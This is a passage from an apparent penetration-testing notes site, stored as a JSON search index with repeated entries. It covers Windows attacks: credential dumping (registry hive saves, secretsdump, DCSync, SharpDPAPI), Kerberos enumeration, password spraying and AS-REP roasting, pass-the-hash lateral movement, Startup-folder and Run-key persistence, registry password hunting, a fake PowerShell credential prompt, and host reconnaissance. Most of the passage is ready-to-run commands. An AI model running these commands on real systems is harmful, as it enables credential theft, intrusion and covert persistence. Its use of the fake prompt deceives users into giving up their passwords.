save hklm\\system SYSTEM reg save hklm\\security SECURITY Copy over the files, SAM, SYSTEM, and SECURITY, which should now be in the current working directory to your local system and use impacket to convert them into a readable format with the command: impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL DPAPI User/Machine Triaging List all user credentials, vault, and RDG DPAPI blobs using a password. Can also be run without a password if the beacon is running under the user's context. SharpDPAPI.exe triage /password:X List all system credentials and vault DPAPI blobs. You need admin rights to execute this. This requires the system master keys that can only be retrieved by the SYSTEM user and cannot be performed remotely. SharpDPAPI.exe machinetriage Domain Backup Key List user credentials, vaults, and RDG blobs on a remote system using a domain backup key. SharpDPAPI.exe triage /pvk:[key_file | b64(key)] /server:X.domain.com","title":"Crdential Dumping"},{"location":"windowsexploitation/credential-dumping/#methods-of-credential-dumping","text":"","title":"Methods of Credential Dumping"},{"location":"windowsexploitation/credential-dumping/#dcsync","text":"","title":"DCSync"},{"location":"windowsexploitation/credential-dumping/#cobalt-strike","text":"Cobalt Strike offers the \u201cdcsync\u201d command which is a wrapper for mimikatz. If you have domain admin trust established with the domain controller, this will replicate all user's NTLM hashes. The command dcsync is a shortcut for mimikatz @lsadump::dcsync /domain:<domain.fqdn /all /csv dcsyn <domain.fqdn>","title":"Cobalt Strike"},{"location":"windowsexploitation/credential-dumping/#crackmapexec","text":"Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional. crackmapexec smb <target> -u admin -p Password123 -d domain --ntds <drsuapi|vss>","title":"CrackMapExec"},{"location":"windowsexploitation/credential-dumping/#manual-dcsync-using-vssadmin","text":"reg save hklm\\sam SAM reg save hklm\\system SYSTEM reg save hklm\\security SECURITY","title":"Manual DCSync using vssadmin"},{"location":"windowsexploitation/credential-dumping/#manual-ntdsdit-extraction-using-ntdsutil","text":"ntdsutil \"ac in ntds\" i \"cr fu c:\\temp\" q q After doing one of the two manual methods, convert to a readable format with impacket on your local system. impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL","title":"Manual NTDS.dit Extraction using ntdsutil"},{"location":"windowsexploitation/credential-dumping/#local-sam-and-lsa","text":"","title":"Local SAM and LSA"},{"location":"windowsexploitation/credential-dumping/#cobalt-strike_1","text":"Use the built-in hashdump command to dump local SAM hashes.","title":"Cobalt Strike"},{"location":"windowsexploitation/credential-dumping/#impacket","text":"Use secretsdump.py to extract credentials remotely. You can do this using a password, NTLM Hash, or with a Kerberos ticket. Also supports extracting credentials from local files. Extract with NTLM hash: secretsdump.py -hashes :6d9dc9bd065d9f9a628b0f1a0c54c976 domain\\username@target Extract with password: secretsdump.py domain\\username:password@target Extract with Kerberos Ticket: secretsdump.py domain\\username@target -k -no-pass To extract with Kerberos ticket first request a TGT with asktgt.py then apply the TGS ticket with export KRB5CCNAME= {.is-info}","title":"Impacket"},{"location":"windowsexploitation/credential-dumping/#crackmapexec_1","text":"Extract hashes from SAM using plaintext password(-p flag): crackmapexec smb <target> -u admin -p Password123 -d domain --sam Extract hashes from LSA using NTLM hash (-H flag): crackmapexec smb <target> -u admin -H <NTLM_HASH> -d domain --lsa","title":"CrackMapExec"},{"location":"windowsexploitation/credential-dumping/#seatbelt","text":"Extract hashes from Security Auth Packages. By default this is usually just NTLMv2. Seatbelt.exe SecPackageCreds","title":"SeatBelt"},{"location":"windowsexploitation/credential-dumping/#manual-method","text":"From the compromised machines, navigate to C:\\Windows\\System32\\Config. This is where the SAM, SYSTEM, and Security hives are located. You cant create a copy using copy because there\u2019s a write block on the files. Save to another location using reg save: reg save hklm\\sam SAM reg save hklm\\system SYSTEM reg save hklm\\security SECURITY Copy over the files, SAM, SYSTEM, and SECURITY, which should now be in the current working directory to your local system and use impacket to convert them into a readable format with the command: impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL","title":"Manual Method"},{"location":"windowsexploitation/credential-dumping/#dpapi","text":"","title":"DPAPI"},{"location":"windowsexploitation/credential-dumping/#usermachine-triaging","text":"List all user credentials, vault, and RDG DPAPI blobs using a password. Can also be run without a password if the beacon is running under the user's context. SharpDPAPI.exe triage /password:X List all system credentials and vault DPAPI blobs. You need admin rights to execute this. This requires the system master keys that can only be retrieved by the SYSTEM user and cannot be performed remotely. SharpDPAPI.exe machinetriage","title":"User/Machine Triaging"},{"location":"windowsexploitation/credential-dumping/#domain-backup-key","text":"List user credentials, vaults, and RDG blobs on a remote system using a domain backup key. SharpDPAPI.exe triage /pvk:[key_file | b64(key)] /server:X.domain.com","title":"Domain Backup Key"},{"location":"windowsexploitation/kerberos/","text":"Attacking Kerberos Kerberos User Enumeration ./kerbrute_linux_amd64 userenum -d <fqdn> --dc <domain_controller> userlist.txt-o valid_users.txt Kerberos Password Spray ./kerbrute_linux_amd64 passwordspray -d <fqdn> domain_users.txt PasswordString AsepRepRoast GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -dc-ip 10.10.51.196 Using the list of valid usernames, check if any can be asepreproasted using getnpusers Crack with mode 18200 which is for Kerberos 5 AS-REP etype 23. Evil-WinRM evil-winrm -i <ip> -u <username> -p <password> -H <NThash>","title":"Kerberos"},{"location":"windowsexploitation/kerberos/#attacking-kerberos","text":"","title":"Attacking Kerberos"},{"location":"windowsexploitation/kerberos/#kerberos-user-enumeration","text":"./kerbrute_linux_amd64 userenum -d <fqdn> --dc <domain_controller> userlist.txt-o valid_users.txt","title":"Kerberos User Enumeration"},{"location":"windowsexploitation/kerberos/#kerberos-password-spray","text":"./kerbrute_linux_amd64 passwordspray -d <fqdn> domain_users.txt PasswordString","title":"Kerberos Password Spray"},{"location":"windowsexploitation/kerberos/#asepreproast","text":"GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -dc-ip 10.10.51.196 Using the list of valid usernames, check if any can be asepreproasted using getnpusers Crack with mode 18200 which is for Kerberos 5 AS-REP etype 23.","title":"AsepRepRoast"},{"location":"windowsexploitation/kerberos/#evil-winrm","text":"evil-winrm -i <ip> -u <username> -p <password> -H <NThash>","title":"Evil-WinRM"},{"location":"windowsexploitation/lateral-movement/","text":"Lateral Movement Techniques SharpWMI https://github.com/GhostPack/SharpWMI Launch payload: SharpWMI.exe action=create computername=<hostname> command=\"C:\\path\\to\\exe\" Crackmapexec Pass the hash of a local account, such as the local administrator account cme smb <target> -u <username> -H '<NTLM_Hash>' --local-auth`` Password authentication with a domain account. In some environments you won't need to supply the domain name. It'll just automatically populate the field. cme smb <target> -u <username> -p '<password>' -d <domain> xfreerdp xfreerdp is usually used for lateral movement through RDP when NLA is enforced because rdesktop does not support NLA. Another plus about xfreerdp is thaty you can use an NTLM hash to authenticate. xfreerdp /u:user /p:password /v:host","title":"Lateral Movement"},{"location":"windowsexploitation/lateral-movement/#lateral-movement-techniques","text":"","title":"Lateral Movement Techniques"},{"location":"windowsexploitation/lateral-movement/#sharpwmi","text":"https://github.com/GhostPack/SharpWMI Launch payload: SharpWMI.exe action=create computername=<hostname> command=\"C:\\path\\to\\exe\"","title":"SharpWMI"},{"location":"windowsexploitation/lateral-movement/#crackmapexec","text":"Pass the hash of a local account, such as the local administrator account cme smb <target> -u <username> -H '<NTLM_Hash>' --local-auth`` Password authentication with a domain account. In some environments you won't need to supply the domain name. It'll just automatically populate the field. cme smb <target> -u <username> -p '<password>' -d <domain>","title":"Crackmapexec"},{"location":"windowsexploitation/lateral-movement/#xfreerdp","text":"xfreerdp is usually used for lateral movement through RDP when NLA is enforced because rdesktop does not support NLA. Another plus about xfreerdp is thaty you can use an NTLM hash to authenticate. xfreerdp /u:user /p:password /v:host","title":"xfreerdp"},{"location":"windowsexploitation/persistence/","text":"Windows Persistence Techniques The purpose of persistence is to maintain your access after a reboot or process termination. Startup Folder and Registry Key Runs Don't need local admin to use these techniques. Copy or place the executable in the startup folder. I think you can also use a shortcut in the StartUp Folder? copy implant.exe \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" Clean up by removing file from the startup folder. Registry Persistence. Can also place in the HKEY_CURRENT_MACHINES path but for that you need to be running as local admin/high integrity. You can test these on your local system by rebooting the system or logging out and logging back in to check if the payload executes. reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MSUpdate /t REG_SZ /d C:\\path\\to\\exe /f Claen up with: reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MSUpdate /f Logon Scripts Uses userinit.exe to launch logon scripts.","title":"Persistence"},{"location":"windowsexploitation/persistence/#windows-persistence-techniques","text":"The purpose of persistence is to maintain your access after a reboot or process termination.","title":"Windows Persistence Techniques"},{"location":"windowsexploitation/persistence/#startup-folder-and-registry-key-runs","text":"Don't need local admin to use these techniques. Copy or place the executable in the startup folder. I think you can also use a shortcut in the StartUp Folder? copy implant.exe \"%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" Clean up by removing file from the startup folder. Registry Persistence. Can also place in the HKEY_CURRENT_MACHINES path but for that you need to be running as local admin/high integrity. You can test these on your local system by rebooting the system or logging out and logging back in to check if the payload executes. reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MSUpdate /t REG_SZ /d C:\\path\\to\\exe /f Claen up with: reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MSUpdate /f","title":"Startup Folder and Registry Key Runs"},{"location":"windowsexploitation/persistence/#logon-scripts","text":"Uses userinit.exe to launch logon scripts.","title":"Logon Scripts"},{"location":"windowsexploitation/privilege-escalation/","text":"Windows Privilege Escalation Techniques Searching for sensitive filles Start by searching for sensitive files on the local C drive. After that search any reachable network shares. SharpShares can be used to search for open network shares. dir /b /a /s c:\\ > c-dirs.txt SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$ Either extract the c-dirs.txt file onto your system and use your tool/text editor of choice to search for sensitive file. If you prefer to stay on the windows system and search through the file, use type and findstr to search for sensitive string. type c-dirs.txt | findstr /i passw Registry Queries Passwords for putty, vnc, and OpenSSH keys can be stored in the registry. reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" reg query \"HKCU\\Software\\TightVNC\\Server\" reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" reg query \"HKCU\\Software\\OpenSSH\\Agent\\Keys\" reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Seatbelt.exe WindowsAutoLogon Seatbelt.exe reg Credential Manager Credentials stored in the windows credential manager can be abused to run commands or launch payloads as another users. List stored credentials cmdkey /list Use a stored credential runas /savecred /user:admin implant.exe Seatbelt.exe CredEnum Asking for Credentials Only a viable attack path if there's a user logged into the system. This can also burn you if the user gets suspicious. Request password for current user, using environment variable for the user: powershell \"$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password\" Request password for current user, using hard-coded username (admin in this example): powershell \"$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password\" Unsecured Services Identify Unquoted Service Paths with WMIC: wmic can trigger alerts in some environments. wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" Identify services Everyone, Users, and Authenticated users have write access on with accesschk.exe accesschk.exe -accepteula -wuvc \"Everyone\" * accesschk.exe -accepteula -wuvc \"Users\" * accesschk.exe -accepteula -wuvc \"Authenticated Users\" * View Password Policy Password spray attacks can sometimes lead to elevating privileges if you're lucky. Knowing the password policy can greatly increase your success rate and efficiency. For example, if you know the password length is set to 15, you won't waste time spraying 8 character lenght passwords. ALthough there are sometimes when an old service account which hasn't had a password change in 10 years is using a password that falls outside the curretn password complexity rules. net accounts Host Reconnaissance User and system information echo hostname: %computername% echo username: %username% whoami /all query session echo date: && date /t echo time: && time /t echo environment: && set echo system information: && systeminfo wmic bios wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace net accounts net users net localgroup net localgroup administrators Networking Information ipconfig /all route print echo ARP Table: && arp -A netstat -ano net share net use wmic netuse list full netsh firewall show state netsh firewall show config Processes, services, tasks, startup tasklist /v wmic process get CSName,Description,ExecutablePath,ProcessId schtasks /query /fo LIST /v sc query tasklist /SVC wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName wmic startup get Caption,Command,Location,User Installed software, patches, drivers, AV wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version wmic qfe get HotFixID,InstalledOn driverquery /v WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct","title":"Privilege Escalation"},{"location":"windowsexploitation/privilege-escalation/#windows-privilege-escalation-techniques","text":"","title":"Windows Privilege Escalation Techniques"},{"location":"windowsexploitation/privilege-escalation/#searching-for-sensitive-filles","text":"Start by searching for sensitive files on the local C drive. After that search any reachable network shares. SharpShares can be used to search for open network shares. dir /b /a /s c:\\ > c-dirs.txt SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$ Either extract the c-dirs.txt file onto your system and use your tool/text editor of choice to search for sensitive file. If you prefer to stay on the windows system and search through the file, use type and findstr to search for sensitive string. type c-dirs.txt | findstr /i passw","title":"Searching for sensitive filles"},{"location":"windowsexploitation/privilege-escalation/#registry-queries","text":"Passwords for putty, vnc, and OpenSSH keys can be stored in the registry. reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" reg query \"HKCU\\Software\\TightVNC\\Server\" reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" reg query \"HKCU\\Software\\OpenSSH\\Agent\\Keys\" reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Seatbelt.exe WindowsAutoLogon Seatbelt.exe reg","title":"Registry Queries"},{"location":"windowsexploitation/privilege-escalation/#credential-manager","text":"Credentials stored in the windows credential manager can be abused to run commands or launch payloads as another users. List stored credentials cmdkey /list Use a stored credential runas /savecred /user:admin implant.exe Seatbelt.exe CredEnum","title":"Credential Manager"},{"location":"windowsexploitation/privilege-escalation/#asking-for-credentials","text":"Only a viable attack path if there's a user logged into the system. This can also burn you if the user gets suspicious. Request password for current user, using environment variable for the user: powershell \"$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password\" Request password for current user, using hard-coded username (admin in this example): powershell \"$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password\"","title":"Asking for Credentials"},{"location":"windowsexploitation/privilege-escalation/#unsecured-services","text":"Identify Unquoted Service Paths with WMIC: wmic can trigger alerts in some environments. wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" Identify services Everyone, Users, and Authenticated users have write access on with accesschk.exe accesschk.exe -accepteula -wuvc \"Everyone\" * accesschk.exe -accepteula -wuvc \"Users\" * accesschk.exe -accepteula -wuvc \"Authenticated Users\" *","title":"Unsecured Services"},{"location":"windowsexploitation/privilege-escalation/#view-password-policy","text":"Password spray attacks can sometimes lead to elevating privileges if you're lucky. Knowing the password policy can greatly increase your success rate and efficiency. For example, if you know the password length is set to 15, you won't waste time spraying 8 character lenght passwords. ALthough there are sometimes when an old service account which hasn't had a password change in 10 years is using a password that falls outside the curretn password complexity rules. net accounts","title":"View Password Policy"},{"location":"windowsexploitation/privilege-escalation/#host-reconnaissance","text":"User and system information echo hostname: %computername% echo username: %username% whoami /all query session echo date: && date /t echo time: && time /t echo environment: && set echo system information: && systeminfo wmic bios wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace net accounts net users net localgroup net localgroup administrators Networking Information ipconfig /all route print echo ARP Table: && arp -A netstat -ano net share net use wmic netuse list full netsh firewall show state netsh firewall show config Processes, services, tasks, startup tasklist /v wmic process get CSName,Description,ExecutablePath,ProcessId schtasks /query /fo LIST /v sc query tasklist /SVC wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName wmic startup get Caption,Command,Location,User Installed software, patches, drivers, AV wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version wmic qfe get HotFixID,InstalledOn driverquery /v WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct","title":"Host Reconnaissance"}]}